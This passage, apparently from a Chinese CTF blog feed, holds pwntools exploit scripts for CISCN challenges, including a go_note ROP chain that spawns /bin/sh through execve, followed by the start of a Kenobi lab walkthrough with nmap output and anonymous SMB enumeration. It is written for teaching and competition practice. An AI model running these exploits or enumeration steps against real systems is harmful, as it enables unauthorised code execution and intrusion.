operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.27.so'</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è‡³äºpatchçš„è¯ï¼Œæˆ‘é¦–å…ˆçš„æ€è·¯æ˜¯é™åˆ¶ memcpy è¯»å…¥ä¸ºä¸€ä¸ªå®šå€¼ï¼Œä½†æ˜¯æ­»æ´»è¿‡ä¸æ‰check<br><img src="/EXP_FILE/704dfb3bbb15aeedd79bdb4d09416ffa_MD5.jpeg"><br>æƒ³æƒ³ç´¢æ€§ç›´æ¥æŠŠmemcpyåˆ æ‰ï¼Œæ”¹ä¸‹putsçš„å‚æ•°ä¸ºrcxï¼Œä¸å½±å“æ­£å¸¸æœåŠ¡<br><img src="/EXP_FILE/703afa5a3337bdd51e4d53d2faa6db76_MD5.jpeg"><br><img src="/EXP_FILE/af47872762f6925e6788a8a4856389dc_MD5.jpeg"></p><h1 id="go-note"><a href="#go-note" class="headerlink" title="go_note"></a>go_note</h1><p>goè¯­è¨€é™æ€å°ç¨‹åºï¼Œæœ‰æ ˆæº¢å‡ºã€‚ï¼ˆciscnå¯¹goæƒ…æœ‰ç‹¬é’Ÿå—ï¼‰</p><p>èµ°open_syscallåœ¨bssä¸Šå†™binshï¼Œç„¶åexecve_syscallå³å¯ï¼Œåªæ˜¯å¯„å­˜å™¨çš„gadgetéš¾æ‰¾ä¸€äº›</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">'Your choice > '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Please input note content: '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Please input note id: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Please input note id: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Please input new content: '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Please input note id: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>bss<span class="token operator">=</span><span class="token number">0x527000</span><span class="token operator">+</span><span class="token number">0x2000</span>rdi<span class="token operator">=</span><span class="token number">0x0000000000462946</span>rsi_rsp_0xf8_rbp<span class="token operator">=</span><span class="token number">0x0000000000462552</span>rdx<span class="token operator">=</span><span class="token number">0x000000000047a8fa</span>rax_rbp<span class="token operator">=</span><span class="token number">0x0000000000404408</span>syscall<span class="token operator">=</span><span class="token number">0x000000000040316C</span>sadd<span class="token punctuation">(</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">'b *0x000000000047F41E'</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">0x40</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rsi_rsp_0xf8_rbp<span class="token punctuation">,</span>bss<span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0xf8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdx<span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>syscall<span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi<span class="token punctuation">,</span>bss<span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rsi_rsp_0xf8_rbp<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0xf8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdx<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rax_rbp<span class="token punctuation">,</span><span class="token number">0x3b</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>syscall<span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>s<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 100"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'note'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è‡³äºpatchçš„è¯ï¼ŒæŠŠå¾ªç¯æ”¹æˆå®šå€¼å°±è¿‡checkäº†<br><img src="/EXP_FILE/e148411ef445b5c558fb60fb7ef80bb4_MD5.jpeg"></p><h1 id="staticlink"><a href="#staticlink" class="headerlink" title="staticlink"></a>staticlink</h1><p>æˆ‘æ˜¯æ‡’ç‹—ï¼Œæ‡’å¾—çœ‹äº†</p>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Kenobbi</title>
      <link href="/2024/05/11/Kenobi/"/>
      <url>/2024/05/11/Kenobi/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æœ‰å…³åˆ©ç”¨ Linux æœºå™¨çš„æ¼”ç»ƒã€‚æšä¸¾ Samba å…±äº«ã€æ“çºµ proftpd çš„æ˜“å—æ”»å‡»ç‰ˆæœ¬å¹¶é€šè¿‡è·¯å¾„å˜é‡æ“çºµæ¥å‡çº§æ‚¨çš„æƒé™ã€‚</p></blockquote><h1 id="æ³„éœ²"><a href="#æ³„éœ²" class="headerlink" title="æ³„éœ²"></a>æ³„éœ²</h1><p>nmapå…ˆæ‰«ä¸€éï¼Œlinuxæœºå™¨ï¼Œå¼€äº†21ã€22ï¼Œ80ï¼Œä»¥åŠ135ã€445ç«¯å£çš„SMB</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Nmap scan report for 10.10.26.229Host is up (0.23s latency).Not shown: 993 closed tcp ports (reset)PORT     STATE SERVICE     VERSION21/tcp   open  ftp         ProFTPD 1.3.522/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)| http-methods: |_  Supported Methods: POST OPTIONS GET HEAD|_http-title: Site doesn't have a title (text/html).| http-robots.txt: 1 disallowed entry |_/admin.html111/tcp  open  rpcbind     2-4 (RPC #100000)139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)2049/tcp open  nfs         2-4 (RPC #100003)No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).TCP/IP fingerprint:OS:SCAN(V=7.94SVN%E=4%D=5/31%OT=21%CT=1%CU=44711%PV=Y%DS=2%DC=T%G=Y%TM=6659OS:D436%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)OS:SEQ(SP=104%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)SEQ(SP=104%GCD=1%ISR=10A%TIOS:=Z%CI=I%II=I%TS=8)OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=MOS:508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DOS:F%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DOS:F=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=OS:Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DFOS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=OS:%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=GOS:)IE(R=Y%DFI=N%T=40%CD=S)Uptime guess: 0.076 days (since Fri May 31 19:54:28 2024)Network Distance: 2 hopsTCP Sequence Prediction: Difficulty=259 (Good luck!)IP ID Sequence Generation: All zerosService Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelHost script results:| smb2-time: |   date: 2024-05-31T13:44:12|_  start_date: N/A| smb2-security-mode: |   3:1:1: |_    Message signing enabled but not required| smb-os-discovery: |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)|   Computer name: kenobi|   NetBIOS computer name: KENOBI\x00|   Domain name: \x00|   FQDN: kenobi|_  System time: 2024-05-31T08:44:12-05:00| smb-security-mode: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)|_clock-skew: mean: 1h39m59s, deviation: 2h53m13s, median: -1s| nbstat: NetBIOS name: KENOBI, NetBIOS user: &lt;unknown>, NetBIOS MAC: &lt;unknown> (unknown)| Names:|   KENOBI&lt;00>           Flags: &lt;unique>&lt;active>|   KENOBI&lt;03>           Flags: &lt;unique>&lt;active>|   KENOBI&lt;20>           Flags: &lt;unique>&lt;active>|   \x01\x02__MSBROWSE__\x02&lt;01>  Flags: &lt;group>&lt;active>|   WORKGROUP&lt;00>        Flags: &lt;group>&lt;active>|   WORKGROUP&lt;1d>        Flags: &lt;unique>&lt;active>|_  WORKGROUP&lt;1e>        Flags: &lt;group>&lt;active>TRACEROUTE (using port 1025/tcp)HOP RTT       ADDRESS1   250.87 ms 10.11.0.12   250.88 ms 10.10.26.229<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰«ç›®å½•ä¹Ÿå¹¶æ²¡æœ‰å‘ç°ä»€ä¹ˆå¯ç”¨çš„</p><p>è¯¥ä¸»æœºåä¸ºKENOBIï¼Œå·¥ä½œç»„ä¸ºWORKGROUPï¼Œå…¶SMBå…±äº«ç€ä¸€ä¸ªåä¸º anonymous çš„ç›®å½•ï¼Œå°è¯•èƒ½å¦åŒ¿åç™»å½•ï¼š<br><img src="/Red_FILE/c94765f113921783c9fdc765038e6ac5_MD5.jpeg"></p><p>ä¸‹è½½ä¸‹æ¥ä¸€ä¸ªåä¸ºlog.txtçš„æ–‡ä»¶</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Generating public/private rsa key pair.Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): Created directory '/home/kenobi/.ssh'.Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /home/kenobi/.ssh/id_rsa.Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.The key fingerprint is:SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobiThe key's randomart image is:+---[RSA 2048]----+|                 ||           ..    ||        . o. .   ||       ..=o +.   ||      . So.o++o. ||  o ...+oo.Bo*o  || o o ..o.o+.@oo  ||  . . . E .O+= . ||     . .   oBo.  |+----[SHA256]-----+# This is a basic ProFTPD configuration file (rename it to # 'proftpd.conf' for actual use.  It establishes a single server# and a single anonymous login.  It assumes that you have a user/group# "nobody" and "ftp" for normal operation and anon.ServerName"ProFTPD Default Installation"ServerTypestandaloneDefaultServeron# Port 21 is the standard FTP port.Port21# Don't use IPv6 support by default.UseIPv6off# Umask 022 is a good standard umask to prevent new dirs and files# from being group and world writable.Umask022# To prevent DoS attacks, set the maximum number of child processes# to 30.  If you need to allow more than 30 concurrent connections# at once, simply increase this value.  Note that this ONLY works# in standalone mode, in inetd mode you should use an inetd server# that allows you to limit maximum number of processes per service# (such as xinetd).MaxInstances30# Set the user and group under which the 